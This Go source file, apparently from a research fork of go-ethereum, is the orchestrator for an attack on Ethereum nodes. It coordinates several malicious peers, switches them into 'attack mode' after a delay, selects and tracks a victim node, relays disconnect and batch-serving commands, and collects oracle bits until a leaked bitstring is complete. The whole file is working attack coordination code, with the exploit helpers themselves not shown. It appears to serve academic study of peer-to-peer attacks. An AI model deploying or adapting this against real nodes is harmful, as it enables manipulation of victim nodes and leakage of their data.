package orchestrator

import "fmt"
import "net"
import "time"
import "sync"
import "encoding/binary"
import "github.com/ethereum/go-ethereum/attack/buildchain"
import "github.com/ethereum/go-ethereum/attack/msg"
import "github.com/ethereum/go-ethereum/attack/utils"

const (
	ADDR = "localhost"
)
var (
	port = "45678"
)

type Orchestrator struct {
	peerset *PeerSet
	quitCh chan struct{}
	errc chan error
	incoming chan *peerMessage
	victim string
	oracleCh chan byte
	oracleReply []byte
	attackPhase utils.AttackPhase
	chainBuilt bool
	localMaliciousPeers bool
	firstMasterSet bool
	mu sync.Mutex
}

func New(errc chan error) *Orchestrator {
	o := &Orchestrator {
		peerset: &PeerSet{
			peers: make(map[string]*Peer),
		},
		quitCh: make(chan struct{}),		// Useless (?) for now as termination upon success/fail is signaled
											// through errc channel
		errc: errc,
		incoming: make(chan *peerMessage),
		oracleCh: make(chan byte),
		attackPhase: utils.StalePhase,
		chainBuilt: false,
		localMaliciousPeers: true,
		firstMasterSet: false,
	}

	return o
}

func (o *Orchestrator) Start(rebuild bool, port string) {
	go o.handleMessages()
	go o.addPeers(port)
	go func() {
		predictionChainLength := utils.NumBatchesForPrediction*utils.BatchSize + 88
		err := buildchain.BuildChain(utils.PredictionChain, predictionChainLength, rebuild)
		if err != nil {
			o.errc <- err
			o.close()
			return
		}
		o.chainBuilt = true
	}()

	if o.localMaliciousPeers {
		//TODO: Start two peers with 'mgeth'
	}

	fmt.Println("Orchestrator started")
}

func (o *Orchestrator) addPeers(port string) {
	l, err := net.Listen("tcp", ADDR+":"+port)
	if err != nil {
		fmt.Println("Error listening on the network")
		o.errc <- err
		return
	}
	defer l.Close()

	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting new connection\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		buf := make([]byte, 8)
		_, err = conn.Read(buf)
		if err != nil {
			fmt.Println("Error receiving peer's ID\nerr =", err)
			fmt.Println("Still listening for new peers")
			continue
		}

		peerId := string(buf[:])
		peer := &Peer {
			id: peerId,
			conn: conn,
			stop: make(chan struct{}),
		}

		o.peerset.add(peerId, peer)
		fmt.Println("Peer " + peerId + " joined (numPeers:", o.peerset.len(), "\b)")

		//peer.distributeChain(utils.PredictionChain)

		go func() {
			peer.readLoop(o.incoming, o.quitCh, o.errc)
			o.peerset.remove(peerId)
		}()
		
		err = o.initPeer(peer)
		if err != nil {
			fmt.Println("Could not initialize peer correctly")
			o.peerset.remove(peerId)
			continue
		}
		err = o.sendAll(msg.NewMaliciousPeer.SetContent([]byte(peerId)))
		if err != nil {
			fmt.Println("Could not notify new peer to already connected peers")
			o.close()
			o.errc <- err
			return
		}

		/*
		Here, we arbitrarily choose to make the attack start after bootingTime seconds from when the two
		malicious peers are ready. In other words, the attacker doesn't look for a victim in the first
		bootingTime seconds. This simulates the fact that a real attacker has its Ethereum nodes in
		standard operation and at some point he switches them to "attack mode".
		When this happens, one of the two will stop accepting new peers from the network until a victim
		is picked: this is another reason why we want to keep both nodes in "normal operation" at the
		beginning, i.e. to establish some peering connections to other honest nodes.
		*/
		bootingTime := 60*time.Second
		if o.peerset.len() >= 2 && o.attackPhase==utils.StalePhase && o.chainBuilt {
			go func() {
				time.Sleep(bootingTime)
				o.attackPhase = utils.ReadyPhase
				err = o.sendAll(msg.SetAttackPhase.SetContent([]byte{byte(o.attackPhase)}))
				if err != nil {
					fmt.Println("Could not notify start of the attack")
					o.close()
					o.errc <- err
					return
				}
				randPeer := o.peerset.randGet()
				err = o.sendAllExcept(msg.AvoidVictim.SetContent([]byte{1}), randPeer)
				if err != nil {
					fmt.Println("Could not set avoidVictim")
					o.close()
					o.errc <- err
					return
				}
				o.leadAttack()
			}()
		}
	}

}

func (o *Orchestrator) leadAttack() {
	//TODO: start leadAttack() immediately and wait here for the two peers
	fmt.Println("Attack ready to go")
	defer o.close()

	for {
		bit := <-o.oracleCh
		fmt.Println("Received new oracle bit:", bit)
		o.oracleReply = append(o.oracleReply, bit)
		
		if len(o.oracleReply)==utils.RequiredOracleBits {
			fmt.Println("Leaked bitstring:", o.oracleReply)
			break
		}
	}

	o.errc <- nil
}

func (o *Orchestrator) handleMessages() {
	for {
		select {
		case <- o.quitCh:
			return

		case peermsg := <-o.incoming:
			message := peermsg.message
			sender := peermsg.peer

			switch message.Code {
			case msg.BatchRequestServed.Code:
				go func() {
					err := o.send(o.peerset.masterPeer, message)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.MasterPeer.Code:
				o.peerset.masterPeer = sender
				fmt.Println("Master peer " + o.peerset.masterPeer.id + " is now leading victim sync")
			case msg.SetVictim.Code:
				victimID := string(message.Content)
				if o.victim == "" {
					o.victim = victimID
					fmt.Println("Found new victim: " + victimID)
				} else if o.victim != victimID {
					fmt.Println("Something wrong happened setting victim ID: oldID = " + o.victim + ", newID = "+ victimID)
					o.errc <- utils.ParameterErr
					o.close()
					return
				}
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.SetAttackPhase.Code:
				o.attackPhase = utils.AttackPhase(message.Content[0])
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.OracleBit.Code:
				o.oracleCh <- message.Content[0]
			case msg.MustDisconnectVictim.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.SolicitMustDisconnectVictim.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			case msg.ServeLastFullBatch.Code:
				go func() {
					err := o.sendAllExcept(message, sender)
					if err != nil {
						o.errc <- err
						o.close()
						return
					}
				}()
			}
		}
	}
}

func (o *Orchestrator) Wait() {
	<-o.quitCh
	return
}

func (o *Orchestrator) initPeer (p *Peer) error {
	for id, _ := range o.peerset.peers {
		err := o.send(p, msg.NewMaliciousPeer.SetContent([]byte(id)))
		if err != nil {
			return err
		}
	}

	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, utils.NumBatchesForPrediction)
	err := o.send(p, msg.SetNumBatches.SetContent(buf))
	if err != nil {
			return err
		}

		/*
	o.mu.Lock()
	if o.firstMasterSet {
		err = o.send(p, msg.AvoidVictim.SetContent([]byte{1}))
	} else {
		o.firstMasterSet = true
	}
	o.mu.Unlock()
	*/
	return err
}

func (o *Orchestrator) send(p *Peer, message *msg.Message) error {
	buf := message.Encode()
	n, err := p.conn.Write(buf)
	if err != nil {
		return err
	}
	if n < len(buf) {
		return utils.PartialSendErr
	}
	return nil
}

func (o *Orchestrator) sendAllExcept(message *msg.Message, toExclude *Peer) error {
	for _, peer := range o.peerset.peers {
		if peer.id == toExclude.id {
			continue
		}
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) sendAll(message *msg.Message) error {
	for _, peer := range o.peerset.peers {
		if err := o.send(peer, message); err != nil {
			return err
		}
	}

	return nil
}

func (o *Orchestrator) close() {
	close(o.quitCh)
	close(o.incoming)
	o.peerset.close()
	return
}


